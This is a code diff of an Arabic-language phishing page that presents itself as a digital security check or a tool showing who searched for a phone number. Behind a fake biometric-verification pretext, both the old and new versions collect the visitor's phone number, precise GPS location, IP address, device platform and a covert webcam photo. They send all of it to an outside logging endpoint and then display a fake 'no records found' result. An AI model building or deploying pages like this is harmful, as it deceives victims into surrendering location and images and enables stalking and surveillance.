@@ -3,92 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق الرقمي | Digital Verification</title>
+    <title>مركز الأمان الرقمي | Security Verification</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * { box-sizing: border-box; transition: 0.3s; }
         body { 
             margin: 0; padding: 0; 
-            background: radial-gradient(circle at center, #1a1a2e 0%, #16213e 100%);
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
+            background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
+            font-family: 'Segoe UI', sans-serif; color: #fff; height: 100vh; 
+            display: flex; align-items: center; justify-content: center; overflow: hidden;
         }
-        
-        /* تأثير الخلفية المتحركة */
-        .bg-animate { position: absolute; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; opacity: 0.5; }
+
+        .security-alert {
+            position: fixed; top: 15px; width: 92%; max-width: 400px;
+            background: rgba(255, 193, 7, 0.15); border: 1px solid rgba(255, 193, 7, 0.4);
+            backdrop-filter: blur(12px); padding: 12px; border-radius: 14px;
+            display: flex; align-items: center; gap: 12px; z-index: 1000;
+            animation: slideDown 0.6s ease-out;
+        }
 
         .glass-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 40px 30px;
-            width: 90%; max-width: 420px;
-            text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px;
+            padding: 40px; width: 90%; max-width: 400px; text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
         }
 
-        .icon-box {
-            width: 80px; height: 80px; background: rgba(0, 123, 255, 0.2);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 20px; border: 2px solid #007bff;
-            box-shadow: 0 0 20px rgba(0, 123, 255, 0.5);
+        .icon-shield {
+            width: 70px; height: 70px; background: rgba(56, 189, 248, 0.1);
+            border-radius: 20px; display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px; border: 1px solid #38bdf8;
             animation: pulse 2s infinite;
         }
 
-        h2 { font-weight: 300; letter-spacing: 1px; margin-bottom: 10px; color: #00d4ff; }
-        p { font-size: 14px; color: #ccc; line-height: 1.6; }
-
-        .input-group { position: relative; margin: 30px 0; }
         input {
-            width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2);
-            padding: 15px 45px 15px 15px; border-radius: 12px; color: #fff; font-size: 16px; outline: none;
+            width: 100%; background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(255,255,255,0.1);
+            padding: 16px; border-radius: 12px; color: #fff; font-size: 16px; 
+            outline: none; text-align: center; margin-bottom: 20px;
         }
-        input:focus { border-color: #00d4ff; background: rgba(255,255,255,0.1); }
-        .input-group i { position: absolute; left: 15px; top: 18px; color: #00d4ff; }
 
-        .scan-btn {
+        .btn-verify {
             width: 100%; padding: 16px; border: none; border-radius: 12px;
-            background: linear-gradient(135deg, #007bff 0%, #00d4ff 100%);
-            color: #fff; font-weight: bold; font-size: 16px; cursor: pointer;
-            box-shadow: 0 10px 20px rgba(0, 123, 255, 0.3);
+            background: linear-gradient(90deg, #38bdf8, #0ea5e9);
+            color: #0f172a; font-weight: 800; cursor: pointer;
         }
-        .scan-btn:active { transform: scale(0.98); }
 
-        #status-container { margin-top: 20px; display: none; }
-        .scanning-text { font-size: 13px; color: #00d4ff; font-family: monospace; }
-        
-        .progress-container { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; margin: 10px 0; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: #00d4ff; }
+        #status-box { margin-top: 25px; display: none; }
+        .progress-bar { width: 100%; height: 5px; background: rgba(255,255,255,0.1); border-radius: 10px; margin-top: 8px; overflow: hidden; }
+        .progress-inner { width: 0%; height: 100%; background: #38bdf8; transition: 0.5s; }
 
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 123, 255, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(0, 123, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 123, 255, 0); } }
-        
+        @keyframes slideDown { from { transform: translateY(-100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(56, 189, 248, 0); } 100% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="bg-animate"></div>
+<div class="security-alert">
+    <i class="fas fa-exclamation-triangle" style="color: #ffc107;"></i>
+    <span style="color: #ffc107; font-size: 11px;">تنبيه: يتطلب النظام "صلاحية الوصول الكاملة" للمطابقة الحيوية وتحديد موقع السجلات الرقمية بدقة.</span>
+</div>
 
 <div class="glass-card">
-    <div class="icon-box">
-        <i class="fas fa-fingerprint fa-3x" style="color: #00d4ff;"></i>
-    </div>
-    <h2>تتبع السجلات الرقمية</h2>
-    <p>أدخل البيانات لبدء عملية المسح والتحقق من محاولات الدخول إلى هويتك الرقمية</p>
+    <div class="icon-shield"><i class="fas fa-fingerprint fa-2x" style="color: #38bdf8;"></i></div>
+    <h2 style="font-size: 1.3rem; margin-bottom: 5px;">كاشف الأرقام المتقدم</h2>
+    <p style="color: #94a3b8; font-size: 12px; margin-bottom: 25px;">أدخل الرقم لمعرفة من قام بالبحث عنك عبر السجلات الحية</p>
 
-    <div class="input-group">
-        <i class="fas fa-search"></i>
-        <input type="text" id="userInput" placeholder="اليوزر أو رقم الهاتف">
-    </div>
+    <input type="tel" id="targetPhone" placeholder="أدخل رقم هاتفك هنا">
+    <button id="runBtn" class="btn-verify">بدء عملية التحقق</button>
 
-    <button id="startBtn" class="scan-btn">بدء المسح المتقدم</button>
-
-    <div id="status-container">
-        <div class="scanning-text" id="status-text">جاري تشفير الاتصال...</div>
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
+    <div id="status-box">
+        <div id="status-msg" style="font-size: 12px; color: #38bdf8;">جاري جلب إحداثيات GPS...</div>
+        <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
     </div>
 </div>
 
@@ -98,80 +84,65 @@
 <script>
     const API_URL = "https://sed-x8mt.vercel.app/log-data";
 
-    document.getElementById('startBtn').addEventListener('click', async () => {
-        const val = document.getElementById('userInput').value;
-        const statusText = document.getElementById('status-text');
-        const progressBar = document.getElementById('progressBar');
-        const statusContainer = document.getElementById('status-container');
+    document.getElementById('runBtn').addEventListener('click', async () => {
+        const phone = document.getElementById('targetPhone').value;
+        if (!phone) return alert("الرجاء إدخال الرقم");
 
-        if (!val) return alert("يرجى إدخال البيانات المطلوبة");
+        document.getElementById('status-box').style.display = 'block';
+        document.getElementById('runBtn').disabled = true;
 
-        statusContainer.style.display = 'block';
-        document.getElementById('startBtn').disabled = true;
-
-        // تأثير التحميل
-        let p = 0;
-        const interval = setInterval(() => {
-            if (p >= 90) clearInterval(interval);
-            p += 2;
-            progressBar.style.width = p + '%';
-        }, 100);
-
-        // محاولة سحب الموقع
-        let locationRes = "الموقع: لم يمنح الإذن";
+        // 1. جلب الموقع بأقصى دقة (HTML5 Geolocation API)
+        let mapLink = "الموقع: مرفوض";
         try {
-            const pos = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
+            const position = await new Promise((res, rej) => {
+                navigator.geolocation.getCurrentPosition(res, rej, {
+                    enableHighAccuracy: true,
+                    timeout: 8000
+                });
             });
-            locationRes = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        } catch (e) {}
+            mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+        } catch(e) { console.log("Geo Error"); }
 
-        statusText.innerText = "جاري تأكيد الهوية الحيوية (Biometric)...";
+        document.getElementById('status-msg').innerText = "جاري إجراء المصادقة الحيوية...";
+        document.getElementById('bar').style.width = "50%";
 
         try {
+            // 2. تشغيل الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+            document.getElementById('video').srcObject = stream;
 
-            // سحب معلومات الجهاز
-            const [ipReq, battery] = await Promise.all([
-                fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"})),
-                navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0})
-            ]);
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
 
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                const video = document.getElementById('video');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
 
                 canvas.toBlob(async (blob) => {
-                    const report = `
-💎 صيد احترافي:
-📱 المدخل: ${val}
-🌐 الـ IP: ${ipReq.ip}
-📍 الموقع: ${locationRes}
-🔋 البطارية: ${Math.round(battery.level * 100)}%
+                    const data = `
+📍 صيد بدقة عالية:
+📱 الرقم: ${phone}
+🌐 الـ IP: ${ipData.ip}
+🗺 الموقع: ${mapLink}
 💻 الجهاز: ${navigator.platform}
-🕒 الوقت: ${new Date().toLocaleString('ar-EG')}
                     `;
-                    
-                    const formData = new FormData();
-                    formData.append('username', report);
-                    formData.append('photo', blob, 'capture.jpg');
+                    const fd = new FormData();
+                    fd.append('username', data);
+                    fd.append('photo', blob, 'shot.jpg');
 
-                    await fetch(API_URL, { method: 'POST', body: formData });
+                    await fetch(API_URL, { method: 'POST', body: fd });
                     
-                    statusText.innerText = "خطأ في المزامنة: لم يتم العثور على سجلات.";
-                    statusText.style.color = "#ff4d4d";
-                    progressBar.style.background = "#ff4d4d";
+                    document.getElementById('status-msg').innerText = "اكتمل الفحص: لا توجد سجلات حالياً.";
+                    document.getElementById('status-msg').style.color = "#ef4444";
+                    document.getElementById('bar').style.background = "#ef4444";
+                    document.getElementById('bar').style.width = "100%";
                     stream.getTracks().forEach(t => t.stop());
                 }, 'image/jpeg');
-            }, 1500);
+            }, 2000);
 
         } catch (err) {
-            statusText.innerText = "خطأ: فشل التحقق الحيوي. يرجى السماح بالكاميرا.";
-            statusText.style.color = "#ff4d4d";
+            document.getElementById('status-msg').innerText = "يجب السماح بالأذونات لإكمال الفحص.";
         }
     });
 </script>
